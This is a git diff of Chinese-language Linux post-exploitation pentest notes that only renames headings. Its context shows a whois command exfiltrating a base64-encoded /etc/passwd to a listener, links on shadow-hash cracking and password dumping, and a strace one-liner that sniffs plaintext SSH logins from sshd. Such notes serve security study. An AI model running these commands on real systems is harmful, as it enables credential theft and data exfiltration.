@@ -310,17 +310,18 @@ whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64`
 
 # 认证
 
-**文章**
+**相关文章**
 - [How to Crack Shadow Hashes After Getting Root on a Linux System](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
 - [Linux下的密码Hash——加密方式与破解方法的技术整理](https://3gstudent.github.io/3gstudent.github.io/Linux%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81Hash-%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/)
 
-**工具**
+**相关工具**
 - [huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin) - 从当前 Linux 用户转储登录密码的工具
 - [Hashcat](../../安全工具/Hashcat.md#爆破shadow文件)
 
 ## 口令抓取
 
 当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面由 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了
+
 ```bash
 strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
 ```
